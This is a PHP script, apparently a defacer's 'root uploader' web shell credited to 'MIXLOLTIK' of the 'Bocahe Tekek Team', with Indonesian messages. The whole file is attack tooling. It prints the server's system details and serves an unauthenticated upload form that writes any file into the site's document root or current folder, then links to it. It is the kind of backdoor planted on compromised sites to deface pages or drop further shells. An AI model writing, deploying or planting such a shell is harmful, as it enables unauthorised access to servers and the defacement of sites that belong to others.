<?php
echo "<i>Priv8 Home Root Uploader by MIXLOLTIK</i> - Bocahe Tekek Team<br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='idx_file'>
	  <input type='submit' name='upload' value='upload'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "Gagal upload di document root.";
		}
	} else {
		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
			echo "Sukses Upload Gan xD <b>$files</b> di folder ini";
		} else {
			echo "Gagal upload Jangan Nangid ea su bajingan";
		}
	}
}
?>